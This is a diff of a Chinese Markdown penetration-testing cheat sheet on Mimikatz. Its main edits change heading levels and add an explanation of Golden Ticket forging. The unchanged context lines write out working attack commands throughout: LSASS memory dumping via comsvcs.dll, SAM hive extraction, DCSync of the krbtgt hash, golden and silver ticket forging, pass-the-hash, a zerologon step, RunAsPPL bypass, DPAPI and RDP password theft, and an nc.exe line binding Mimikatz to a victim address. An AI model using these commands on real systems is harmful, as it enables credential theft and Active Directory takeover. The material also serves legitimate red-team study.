@@ -66,7 +66,7 @@
 
 ---
 
-# 基本使用
+## 基本使用
 
 提权
 ```bash
@@ -125,7 +125,7 @@ vault::cred /patch
 
 ---
 
-# 离线抓取
+## 离线抓取
 
 **相关文章**
 - [Win10及2012系统以后的明文抓取方式](https://www.anquanke.com/post/id/175364)
@@ -186,7 +186,7 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 # 192.168.1.2 为 Victim IP
 ```
 
-## 直接转储
+### 直接转储
 
 在任务管理器找到 lsass.exe，右键创建转储文件
 
@@ -208,7 +208,7 @@ sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
-## comsvcs.dll
+### comsvcs.dll
 
 使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件
 
@@ -223,7 +223,7 @@ Get-Process lsass
 powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
 ```
 
-## sam + mimikatz
+### sam + mimikatz
 
 > 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
 
@@ -239,7 +239,7 @@ reg save HKLM\SECURITY security.hiv
 lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 ```
 
-## windbg 中载入 mimilib 模块
+### windbg 中载入 mimilib 模块
 
 可通过 notmyfault 强制蓝屏
 - https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault
@@ -282,15 +282,15 @@ Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
 
 ---
 
-# 无法抓取 windows 明文密码的解决方法
+## 无法抓取 windows 明文密码的解决方法
 
-## 换个操作系统
+### 换个操作系统
 
 破解 lsass.dmp 文件是需要系统内核版本
 
 比如在 win03 系统上获取到 lsass.dmp 文件要在 win03 下运行 mimikatz 破解
 
-## 改注册表
+### 改注册表
 
 在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
 
@@ -369,7 +369,7 @@ Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
 
     重新读取，可读到明文密码。
 
-## ssp
+### ssp
 
 mimikatz 包含的 SSP 提供自动记录本地验证凭证的功能。这包括计算机账户密码、运行服务凭证和任何登录的账户。默认情况下，这些数据会被记录在与 dll 文件相同的位置上，但也可以在系统的其他地方记录这些数据。如果 Windows 系统是一个提供认证用户访问权限的域控制器，那么备用的日志位置可以在 SYSVOL 中。
 
@@ -379,7 +379,7 @@ misc::memssp
 ```
 记录的结果在 `c:/windows/system32/mimilsa.log`
 
-## dll
+### dll
 
 在 mimikatz 中有 32 和 64 两个版本，安装包里分别都带有不同位数的 mimilib.dll, 将对应版本的 dll 文件复制到 c:\windows\system32 下
 
@@ -392,7 +392,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_
 
 ---
 
-# NTDS.DIT
+## NTDS.DIT
 
 使用 Mimikatz 提取 Active Directory hash
 ```bash
@@ -402,7 +402,7 @@ sekurlsa::minidump c:\temp\lsass.dmp      使用 Mimikatz 转储 LSASS 内存
 sekurlsa::logonpasswords
 ```
 
-## DCSync
+### DCSync
 
 Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。
 
@@ -438,7 +438,7 @@ mimikatz.exe privilege::debug "lsadump::dcsync /domain:ffffffff0x.com /all /csv"
 
 ---
 
-# PTH
+## PTH
 
 在对 Windows 系统进行渗透测试过程中，如果获取目标机器的系统权限，则可以通过 hashdump 的方式获取目标机器历史登录信息，包括用户名和用户明文密码或者用户 hash，如果无法直接获取目标用户明文密码，则可以通过 pth 的方式远程登录目标机器
 
@@ -525,9 +525,9 @@ mimikatz.exe privilege::debug "lsadump::dcsync /domain:ffffffff0x.com /all /csv"
 
 ---
 
-# PTT
+## PTT
 
-## Silver_Tickets
+### Silver_Tickets
 
 导出 Server Hash
 ```bash
@@ -578,9 +578,11 @@ mimikatz "kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-24943
 
 ---
 
-## Golden_Tickets
+### Golden_Tickets
 
-dump krbtgt hash
+在 AS_REQ & AS_REP 中，用户使用自身 hash 加密时间戳发送给 KDC，KDC 验证成功后返回用 krbtgt hash 加密的 TGT 票据。如果攻击者有 krbtgt 的 hash，就可以自己给自己签发任意用户的 tgt 票据。
+
+先导出 krbtgt 的 hash
 ```bash
 privilege::debug
 lsadump::lsa /patch
@@ -590,7 +592,7 @@ lsadump::lsa /patch
 lsadump::dcsync /domain:<域名> /user:krbtgt
 ```
 
-使用 mimikatz 伪造的黄金票据：
+使用 mimikatz 伪造的黄金票据，这里生成 Golden Ticket 不仅可以使用 aes256，也可用 krbtgt 的 NTLM hash
 ```bash
 kerberos::golden /user:<用户名> /domain:<域名> /sid:<域SID> /krbtgt:<Hash> /ticket:test.kiribi
 ```
@@ -641,7 +643,7 @@ kerberos::ptt test.kiribi
 
 ---
 
-# PTK
+## PTK
 
 ```bash
 # 获取用户的 aes key
@@ -656,7 +658,7 @@ mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c
 
 ---
 
-# zerologon
+## zerologon
 
 ```bash
 # 检测
@@ -677,7 +679,7 @@ lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
 
 ---
 
-# 后渗透
+## 后渗透
 
 多用户登录 3389
 ```
@@ -696,7 +698,7 @@ misc::clip
 
 ---
 
-# 绕过RunAsPPL
+## 绕过RunAsPPL
 
 RunAsPPL 有效地阻止了 Mimikatz 访问的内存 lsass.exe
 
@@ -716,7 +718,7 @@ mimikatz # !-
 
 ---
 
-# DPAPI
+## DPAPI
 
 查看目标Windows凭据管理器中是否保存有各种系统连接账密
 ```
@@ -764,7 +766,7 @@ dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID�
 
 ---
 
-# MSTSC Passwords
+## MSTSC Passwords
 
 从 Svchost.exe Dump RDP 明文密码
 ```bash
@@ -778,6 +780,6 @@ ts::mstsc
 
 ---
 
-# 防御手段
+## 防御手段
 
 - [Secure-Win](../../Integrated/Windows/Secure-Win.md#防御密码抓取)
